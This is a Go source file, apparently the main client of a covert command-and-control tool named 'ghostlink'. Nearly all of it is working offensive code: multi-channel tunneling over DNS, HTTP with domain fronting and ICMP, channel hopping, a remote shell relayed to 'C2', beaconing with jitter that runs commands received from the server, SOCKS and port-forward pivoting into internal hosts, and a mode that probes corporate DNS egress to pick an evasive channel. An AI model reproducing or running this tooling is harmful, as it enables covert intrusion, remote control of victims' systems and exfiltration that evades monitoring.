package main

import (
	"crypto/sha256"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/byjanke/ghostlink/pkg/beacon"
	"github.com/byjanke/ghostlink/pkg/channel"
	"github.com/byjanke/ghostlink/pkg/crypto"
	"github.com/byjanke/ghostlink/pkg/forward"
	"github.com/byjanke/ghostlink/pkg/protocol"
	"github.com/byjanke/ghostlink/pkg/shell"
	"github.com/byjanke/ghostlink/pkg/socks"
)

func main() {
	addr := flag.String("addr", "127.0.0.1:16353", "server address")
	channelType := flag.String("channel", "dns", "channel type: dns, http, icmp, ip_id, timing, packet_size, tcp_isn, websocket, doh")
	key := flag.String("key", "", "pre-shared key")
	ecdhe := flag.Bool("ecdhe", false, "ECDH key exchange")
	domain := flag.String("domain", "", "authoritative domain for DNS (enables DNS hierarchy mode)")
	execCmd := flag.String("exec", "", "execute a command and return output")
	doShell := flag.Bool("shell", false, "spawn interactive shell")
	fwd := flag.String("forward", "", "port forward: local_port:remote_host:remote_port")
	dnsRecon := flag.Bool("dns-recon", false, "DNS reconnaissance — test corporate DNS capabilities")
	hop := flag.String("hop", "", "comma-separated channels to hop between (e.g. dns,http,icmp)")
	frontDomain := flag.String("front", "", "domain fronting: use this CDN domain as TLS SNI")
	socksPort := flag.String("socks", "", "start SOCKS5 proxy on this port (e.g. 1080)")
	jitterProfile := flag.String("jitter", "", "beacon jitter profile: low_slow, office, night, burst, random")
	reconnect := flag.Bool("reconnect", false, "auto-reconnect on disconnection")
	maxRetries := flag.Int("retries", 10, "max reconnection attempts")
	flag.Parse()

	if *dnsRecon {
		runDNSRecon()
		return
	}

	connectAndRun := func() {
		var ch channel.Channel
		var sessionKey []byte

		if *hop != "" {
			ch, sessionKey = connectMultiChannel(*hop, *addr, *key, *ecdhe)
		} else if *domain != "" && *channelType == "dns" {
			ch, sessionKey = connectAuthDNS(*domain, *key, *ecdhe, *addr)
		} else {
			ch, sessionKey = connectDirect(*channelType, *addr, *key, *ecdhe, *frontDomain)
		}
		if ch == nil {
			log.Fatal("failed to connect")
		}
		defer ch.Close()

		var cryptoSes *crypto.Session
		if sessionKey != nil {
			var err error
			cryptoSes, err = crypto.NewSession(sessionKey)
			if err != nil {
				log.Fatalf("crypto session: %v", err)
			}
		}

		if *execCmd != "" {
			runCommand(ch, cryptoSes, *execCmd)
			return
		}
		if *doShell {
			runShell(ch, cryptoSes)
			return
		}
		if *fwd != "" {
			runForward(ch, cryptoSes, *fwd)
			return
		}
		if *socksPort != "" {
			runSocks(ch, cryptoSes, *socksPort)
			return
		}

		if *jitterProfile != "" {
			runBeacon(ch, cryptoSes, *jitterProfile)
			return
		}

		fmt.Println("connected. type messages (Ctrl+C to quit):")
		sigCh := make(chan os.Signal, 1)
		signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
		<-sigCh
	}

	if *reconnect {
		for attempt := 0; attempt < *maxRetries; attempt++ {
			if attempt > 0 {
				delay := time.Duration(attempt*5) * time.Second
				if delay > 60*time.Second {
					delay = 60 * time.Second
				}
				fmt.Printf("[*] reconnecting in %v (attempt %d/%d)...\n", delay, attempt+1, *maxRetries)
				time.Sleep(delay)
			}
			func() {
				defer func() {
					if r := recover(); r != nil {
						fmt.Printf("[-] session panic: %v\n", r)
					}
				}()
				connectAndRun()
			}()
			fmt.Println("[-] connection lost")
		}
		fmt.Println("[-] max retries exceeded, exiting")
	} else {
		connectAndRun()
	}
}

func connectMultiChannel(channels, addr, key string, ecdhe bool) (channel.Channel, []byte) {
	types := strings.Split(channels, ",")
	fmt.Printf("ghostlink hop | channels: %v | %s\n", types, addr)

	mc := channel.NewMultiChannel(30 * time.Second)

	for _, t := range types {
		t = strings.TrimSpace(t)
		ch := channel.NewChannel(channel.ChannelType(t))
		if ch == nil {
			fmt.Printf("[-] unknown channel: %s\n", t)
			continue
		}
		cAddr := addr
		if (t == "http" || t == "websocket" || t == "doh") && !strings.HasPrefix(cAddr, "http") {
			cAddr = "http://" + cAddr
		}
		if err := ch.Connect(cAddr); err != nil {
			fmt.Printf("[-] %s: %v\n", t, err)
			continue
		}
		mc.AddChannel(ch)
		fmt.Printf("[+] %s connected\n", t)
	}

	activeCount := mc.ChannelCount()
	if activeCount == 0 {
		log.Fatal("no channels could connect")
	}
	fmt.Printf("[*] %d channels active, rotating every 30s\n", activeCount)

	mc.SetOnSwitch(func(from, to channel.ChannelType) {
		fmt.Printf("[hop] %s -> %s\n", from, to)
	})
	mc.StartRotation()

	var sessionKey []byte
	if ecdhe {
		sk, err := channel.ClientHandshake(mc)
		if err != nil {
			fmt.Printf("[-] ECDHE: %v (continuing without encryption)\n", err)
		} else {
			sessionKey = sk
			fmt.Println("[+] ECDH key exchange complete")
		}
	} else if key != "" {
		h := sha256.Sum256([]byte(key))
		sessionKey = h[:]
	}

	return mc, sessionKey
}

func connectAuthDNS(domain, key string, ecdhe bool, fallbackAddr string) (channel.Channel, []byte) {
	fmt.Printf("ghostlink auth-dns client | domain: %s\n", domain)

	resolver := fallbackAddr
	if resolver == "" || resolver == "127.0.0.1:16353" {
		resolver = "8.8.8.8:53"
	}

	conn, err := net.Dial("udp", resolver)
	if err != nil {
		log.Fatalf("dns resolver: %v", err)
	}

	ch := &authDNSClientChannel{
		conn:     conn.(*net.UDPConn),
		domain:   domain,
		resolver: resolver,
		recvCh:   make(chan []byte, 100),
	}

	fmt.Println("[*] tunneling through DNS hierarchy")
	return ch, nil
}

type authDNSClientChannel struct {
	conn     *net.UDPConn
	domain   string
	resolver string
	recvCh   chan []byte
}

func (c *authDNSClientChannel) Info() channel.ChannelInfo {
	return channel.ChannelInfo{
		Type:        channel.DNSChannel,
		Name:        "Authoritative DNS",
		Description: "Tunnels through real DNS hierarchy via authoritative nameserver",
		Capability:  0.95,
	}
}

func (c *authDNSClientChannel) Connect(addr string) error { return nil }
func (c *authDNSClientChannel) Close() error              { return c.conn.Close() }

func (c *authDNSClientChannel) Send(data []byte) error {
	msg := buildAuthDNSQuery(data, c.domain)
	_, err := c.conn.Write(msg)
	return err
}

func (c *authDNSClientChannel) Recv() ([]byte, error) {
	for attempt := 0; attempt < 5; attempt++ {
		poll := buildAuthDNSQuery([]byte{}, c.domain)
		_, err := c.conn.Write(poll)
		if err != nil {
			return nil, err
		}

		c.conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		buf := make([]byte, 1500)
		n, _, err := c.conn.ReadFromUDP(buf)
		if err != nil {
			if attempt < 4 {
				continue
			}
			return nil, err
		}

		resp := buf[:n]
		if len(resp) < 12 {
			continue
		}

		anCount := int(resp[6])<<8 | int(resp[7])
		if anCount == 0 {
			continue
		}

		data := parseDNSTXTResponse(resp)
		if data != nil {
			return data, nil
		}
	}

	return nil, fmt.Errorf("no data after 5 attempts")
}

func parseDNSTXTResponse(resp []byte) []byte {
	n := len(resp)
	offset := 12
	for offset < n && resp[offset] != 0 {
		labelLen := int(resp[offset])
		if labelLen&0xC0 == 0xC0 {
			offset += 2
			break
		}
		offset += labelLen + 1
	}
	if offset < n && resp[offset] == 0 {
		offset++
	}
	offset += 4

	anCount := int(resp[6])<<8 | int(resp[7])
	for i := 0; i < anCount && offset+10 < n; i++ {
		if resp[offset]&0xC0 == 0xC0 {
			offset += 2
		} else {
			for offset < n && resp[offset] != 0 {
				labelLen := int(resp[offset])
				if labelLen&0xC0 == 0xC0 {
					offset += 2
					break
				}
				offset += labelLen + 1
			}
			if offset < n && resp[offset] == 0 {
				offset++
			}
		}
		if offset+10 > n {
			break
		}
		rtype := int(resp[offset])<<8 | int(resp[offset+1])
		offset += 2
		offset += 2
		offset += 4
		rdlen := int(resp[offset])<<8 | int(resp[offset+1])
		offset += 2

		if rtype == 16 && rdlen > 0 && offset+rdlen <= n {
			rdata := resp[offset : offset+rdlen]
			if len(rdata) > 1 {
				txtLen := int(rdata[0])
				if txtLen+1 <= len(rdata) {
					txt := string(rdata[1 : txtLen+1])
					decoded, err := base64.RawURLEncoding.DecodeString(txt)
					if err == nil {
						return decoded
					}
				}
			}
		}
		offset += rdlen
	}
	return nil
}

func buildAuthDNSQuery(data []byte, domain string) []byte {
	encoded := base64.RawURLEncoding.EncodeToString(data)
	var fqdn string
	if encoded == "" {
		fqdn = "poll." + domain
	} else {
		fqdn = encoded + "." + domain
	}

	var msg []byte
	msg = append(msg, 0x00, 0x01)
	msg = append(msg, 0x01, 0x00)
	msg = append(msg, 0x00, 0x01)
	msg = append(msg, 0x00, 0x00)
	msg = append(msg, 0x00, 0x00)
	msg = append(msg, 0x00, 0x00)
	for _, label := range strings.Split(fqdn, ".") {
		if label == "" {
			continue
		}
		msg = append(msg, byte(len(label)))
		msg = append(msg, []byte(label)...)
	}
	msg = append(msg, 0x00)
	msg = append(msg, 0x00, 0x10)
	msg = append(msg, 0x00, 0x01)
	return msg
}

func connectDirect(chType, addr, key string, ecdhe bool, frontDomain string) (channel.Channel, []byte) {
	fmt.Printf("ghostlink connect | %s | %s", chType, addr)
	if frontDomain != "" {
		fmt.Printf(" | front: %s", frontDomain)
	}
	fmt.Println()

	ch := channel.NewChannel(channel.ChannelType(chType))
	if ch == nil {
		log.Fatalf("unknown channel: %s", chType)
	}

	if chType == "http" && frontDomain != "" {
		channel.SetHTTPFrontDomain(ch, frontDomain)
	}

	connectAddr := addr
	if (chType == "http" || chType == "websocket") && !strings.HasPrefix(connectAddr, "http") {
		connectAddr = "http://" + connectAddr
	}
	if err := ch.Connect(connectAddr); err != nil {
		log.Fatalf("connect: %v", err)
	}

	var sessionKey []byte
	if ecdhe {
		sk, err := channel.ClientHandshake(ch)
		if err != nil {
			log.Fatalf("handshake: %v", err)
		}
		sessionKey = sk
		fmt.Println("[+] ECDH key exchange complete")
	} else if key != "" {
		h := sha256.Sum256([]byte(key))
		sessionKey = h[:]
	}

	return ch, sessionKey
}

func runCommand(ch channel.Channel, cryptoSes *crypto.Session, cmd string) {
	fmt.Printf("[*] executing: %s\n", cmd)

	msg := protocol.Message{Type: protocol.MsgCmdReq, Payload: []byte(cmd)}
	sendMsg(ch, cryptoSes, msg)

	resp := recvMsg(ch, cryptoSes)
	if resp != nil && resp.Type == protocol.MsgCmdRes {
		fmt.Print(string(resp.Payload))
	} else if resp != nil {
		fmt.Printf("[recv] %s\n", string(resp.Payload))
	}
}

func runShell(ch channel.Channel, cryptoSes *crypto.Session) {
	sh, err := shell.Spawn()
	if err != nil {
		log.Fatalf("shell: %v", err)
	}
	defer sh.Close()

	fmt.Println("[*] shell spawned, connected to C2")

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := sh.ReadStdout(buf)
			if err != nil {
				return
			}
			msg := protocol.Message{Type: protocol.MsgShellStdout, Payload: buf[:n]}
			sendMsg(ch, cryptoSes, msg)
		}
	}()

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := sh.ReadStderr(buf)
			if err != nil {
				return
			}
			msg := protocol.Message{Type: protocol.MsgShellStderr, Payload: buf[:n]}
			sendMsg(ch, cryptoSes, msg)
		}
	}()

	go func() {
		for {
			msg := recvMsg(ch, cryptoSes)
			if msg == nil {
				return
			}
			if msg.Type == protocol.MsgShellStdin {
				sh.WriteStdin(msg.Payload)
			}
		}
	}()

	<-sigCh
	fmt.Println("\n[*] shell session closed")
}

func runDNSRecon() {
	fmt.Println("=== Ghostlink DNS Reconnaissance ===")
	fmt.Println()

	resolvers := []struct {
		name string
		addr string
	}{
		{"System DNS", ""},
		{"Google", "8.8.8.8:53"},
		{"Cloudflare", "1.1.1.1:53"},
	}

	domains := []struct {
		name string
		fqdn string
	}{
		{"Internal (acme.local)", "acme.local"},
		{"External (google.com)", "google.com"},
		{"External (github.com)", "github.com"},
	}

	recordTypes := []struct {
		name  string
		qtype uint16
	}{
		{"A", 1},
		{"TXT", 16},
		{"CNAME", 5},
		{"MX", 15},
	}

	for _, r := range resolvers {
		fmt.Printf("[*] Resolver: %s\n", r.name)
		resolverAddr := r.addr

		for _, d := range domains {
			fmt.Printf("    %-30s ", d.name)
			addrs, err := resolveDNS(resolverAddr, d.fqdn, 1)
			if err != nil || len(addrs) == 0 {
				fmt.Print("x unresolved\n")
				continue
			}
			fmt.Print("+ resolved\n")
		}

		if resolverAddr != "" {
			fmt.Printf("    %-30s ", "Direct external DNS")
			addrs, err := resolveDNS(resolverAddr, "google.com", 1)
			if err == nil && len(addrs) > 0 {
				fmt.Print("+ reachable (external DNS allowed)\n")
			} else {
				fmt.Print("x blocked (may need internal DNS only)\n")
			}
		}
		fmt.Println()
	}

	fmt.Println("[*] Record type availability (via 8.8.8.8):")
	for _, rt := range recordTypes {
		fmt.Printf("    %-6s ", rt.name)
		_, err := resolveDNS("", "google.com", rt.qtype)
		if err == nil {
			fmt.Print("+ allowed\n")
		} else {
			fmt.Printf("x %v\n", err)
		}
	}

	fmt.Println()
	fmt.Println("[*] Recommendations:")
	addrs, err := resolveDNS("8.8.8.8:53", "google.com", 1)
	canDirect := err == nil && len(addrs) > 0

	_, txtErr := resolveDNS("", "google.com", 16)

	fmt.Printf("    External DNS direct access:  ")
	if canDirect {
		fmt.Println("YES — use -channel dns (direct mode)")
	} else {
		fmt.Println("NO  — use -domain (auth DNS mode)")
	}

	fmt.Printf("    TXT records allowed:         ")
	if txtErr == nil {
		fmt.Println("YES — standard DNS tunneling works")
	} else {
		fmt.Println("NO  — use CNAME/MX records or -channel http/icmp")
	}

	fmt.Printf("    Recommended channel:         ")
	if canDirect {
		fmt.Println("dns (direct)")
	} else if txtErr == nil {
		fmt.Println("dns (auth DNS via TXT)")
	} else {
		fmt.Println("http or icmp")
	}
}

func resolveDNS(server, domain string, qtype uint16) ([]string, error) {
	if server == "" {
		addrs, err := net.LookupHost(domain)
		if err != nil {
			return nil, err
		}
		return addrs, nil
	}

	msg := buildDNSQueryMsg(domain, qtype)

	conn, err := net.Dial("udp", server)
	if err != nil {
		return nil, fmt.Errorf("dial %s: %w", server, err)
	}
	defer conn.Close()

	_, err = conn.Write(msg)
	if err != nil {
		return nil, fmt.Errorf("write: %w", err)
	}

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 1500)
	n, err := conn.Read(buf)
	if err != nil {
		return nil, fmt.Errorf("read: %w", err)
	}

	return parseDNSAnswers(buf[:n]), nil
}

func buildDNSQueryMsg(domain string, qtype uint16) []byte {
	var msg []byte
	msg = append(msg, byte(time.Now().UnixNano()>>8), byte(time.Now().UnixNano()))
	msg = append(msg, 0x01, 0x00)
	msg = append(msg, 0x00, 0x01)
	msg = append(msg, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)

	for _, label := range strings.Split(domain, ".") {
		if label == "" {
			continue
		}
		msg = append(msg, byte(len(label)))
		msg = append(msg, []byte(label)...)
	}
	msg = append(msg, 0x00)
	msg = append(msg, byte(qtype>>8), byte(qtype&0xFF))
	msg = append(msg, 0x00, 0x01)
	return msg
}

func parseDNSAnswers(resp []byte) []string {
	if len(resp) < 12 {
		return nil
	}
	anCount := int(resp[6])<<8 | int(resp[7])
	if anCount == 0 {
		return nil
	}

	var results []string
	offset := 12

	for offset < len(resp) && resp[offset] != 0 {
		labelLen := int(resp[offset])
		if labelLen&0xC0 == 0xC0 {
			offset += 2
			break
		}
		offset += labelLen + 1
	}
	if offset < len(resp) && resp[offset] == 0 {
		offset++
	}
	offset += 4

	for i := 0; i < anCount && offset+10 < len(resp); i++ {
		if resp[offset]&0xC0 == 0xC0 {
			offset += 2
		} else {
			for offset < len(resp) && resp[offset] != 0 {
				labelLen := int(resp[offset])
				if labelLen&0xC0 == 0xC0 {
					offset += 2
					break
				}
				offset += labelLen + 1
			}
			if offset < len(resp) && resp[offset] == 0 {
				offset++
			}
		}
		if offset+10 > len(resp) {
			break
		}
		rtype := int(resp[offset])<<8 | int(resp[offset+1])
		offset += 2
		offset += 2
		rdlen := int(resp[offset+2])<<8 | int(resp[offset+3])
		offset += 4

		if rtype == 1 && rdlen == 4 && offset+4 <= len(resp) {
			results = append(results, fmt.Sprintf("%d.%d.%d.%d",
				resp[offset], resp[offset+1], resp[offset+2], resp[offset+3]))
		}
		offset += rdlen
	}
	return results
}

func runForward(ch channel.Channel, cryptoSes *crypto.Session, fwdSpec string) {
	parts := strings.SplitN(fwdSpec, ":", 3)
	if len(parts) != 3 {
		log.Fatalf("forward format: local_port:remote_host:remote_port (e.g. 1080:10.0.0.5:3389)")
	}

	localAddr := "0.0.0.0:" + parts[0]
	remoteAddr := parts[1] + ":" + parts[2]

	fmt.Printf("[*] port forward: %s -> %s\n", localAddr, remoteAddr)

	tun := forward.NewTunnel(1, localAddr, remoteAddr)
	tun.SetCallbacks(
		func(tid, cid uint32, data []byte) {
			payload := fmt.Sprintf("%d:%s", cid, string(data))
			msg := protocol.Message{Type: protocol.MsgFwdData, StreamID: tid, Payload: []byte(payload)}
			sendMsg(ch, cryptoSes, msg)
		},
		func(tid, cid uint32) {
			payload := fmt.Sprintf("%d", cid)
			msg := protocol.Message{Type: protocol.MsgFwdClose, StreamID: tid, Payload: []byte(payload)}
			sendMsg(ch, cryptoSes, msg)
		},
	)

	if err := tun.Listen(); err != nil {
		log.Fatalf("forward: %v", err)
	}

	go func() {
		for {
			msg := recvMsg(ch, cryptoSes)
			if msg == nil {
				return
			}
			if msg.Type == protocol.MsgFwdData {
				handleFwdData(*msg, tun)
			}
		}
	}()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
	tun.Close()
}

func handleFwdData(msg protocol.Message, tun *forward.Tunnel) {
	parts := strings.SplitN(string(msg.Payload), ":", 2)
	if len(parts) != 2 {
		return
	}
	var cid uint32
	fmt.Sscanf(parts[0], "%d", &cid)

	if _, err := tun.ReadConn(cid, make([]byte, 1)); err != nil {
		if conn, err := tun.DialAndConnect(cid); err == nil {
			go func() {
				buf := make([]byte, 32768)
				for {
					n, err := conn.Read(buf)
					if err != nil {
						return
					}
					_ = n
				}
			}()
		}
	}

	tun.WriteToConnDirect(cid, []byte(parts[1]))
}

func runSocks(ch channel.Channel, cryptoSes *crypto.Session, port string) {
	listenAddr := "0.0.0.0:" + port
	fmt.Printf("[*] SOCKS5 proxy on %s\n", listenAddr)

	var connIDCounter uint32

	tun := socks.NewTunnel(listenAddr)
	tun.SetCallbacks(
		func(connID uint32, addr string) {
			msg := protocol.Message{
				Type:     protocol.MsgSocksConnect,
				StreamID: connID,
				Payload:  []byte(addr),
			}
			sendMsg(ch, cryptoSes, msg)
			fmt.Printf("[socks] #%d -> %s\n", connID, addr)
		},
		func(connID uint32, data []byte) {
			msg := protocol.Message{
				Type:     protocol.MsgSocksData,
				StreamID: connID,
				Payload:  data,
			}
			sendMsg(ch, cryptoSes, msg)
		},
		func(connID uint32) {
			msg := protocol.Message{
				Type:     protocol.MsgSocksClose,
				StreamID: connID,
			}
			sendMsg(ch, cryptoSes, msg)
		},
	)

	if err := tun.Listen(); err != nil {
		log.Fatalf("socks: %v", err)
	}

	go func() {
		for {
			msg := recvMsg(ch, cryptoSes)
			if msg == nil {
				return
			}
			switch msg.Type {
			case protocol.MsgSocksData:
				tun.WriteToConn(msg.StreamID, msg.Payload)
			case protocol.MsgSocksClose:
				tun.CloseConn(msg.StreamID)
			}
		}
	}()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
	tun.Close()

	_ = connIDCounter
	_ = atomic.AddUint32
}

func runBeacon(ch channel.Channel, cryptoSes *crypto.Session, profile string) {
	j := beacon.New(beacon.ParseProfile(profile))
	fmt.Printf("[*] beacon mode: %s\n", profile)

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		for {
			msg := recvMsg(ch, cryptoSes)
			if msg == nil {
				return
			}
			switch msg.Type {
			case protocol.MsgCmdReq:
				output, err := shell.ExecCommand(string(msg.Payload))
				if err != nil {
					output = []byte(fmt.Sprintf("error: %v", err))
				}
				resp := protocol.Message{Type: protocol.MsgCmdRes, Payload: output}
				sendMsg(ch, cryptoSes, resp)
			case protocol.MsgPong:
				fmt.Println("[*] pong received")
			}
		}
	}()

	go func() {
		for {
			j.Wait()
			msg := protocol.Message{Type: protocol.MsgPing}
			sendMsg(ch, cryptoSes, msg)
		}
	}()

	<-sigCh
}

func sendMsg(ch channel.Channel, cryptoSes *crypto.Session, msg protocol.Message) {
	data := protocol.Marshal(msg)
	if cryptoSes != nil {
		enc, err := cryptoSes.Encrypt(data)
		if err != nil {
			return
		}
		data = enc
	}
	ch.Send(data)
}

func recvMsg(ch channel.Channel, cryptoSes *crypto.Session) *protocol.Message {
	data, err := ch.Recv()
	if err != nil {
		return nil
	}
	if cryptoSes != nil {
		dec, err := cryptoSes.Decrypt(data)
		if err != nil {
			return nil
		}
		data = dec
	}
	msg, err := protocol.Unmarshal(data)
	if err != nil {
		return nil
	}
	return &msg
}

var _ = io.Discard
